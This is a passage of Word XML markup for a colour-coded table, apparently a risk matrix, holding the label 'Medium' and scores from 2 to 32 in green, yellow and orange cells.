            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:right="63"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:right="3"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="101"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
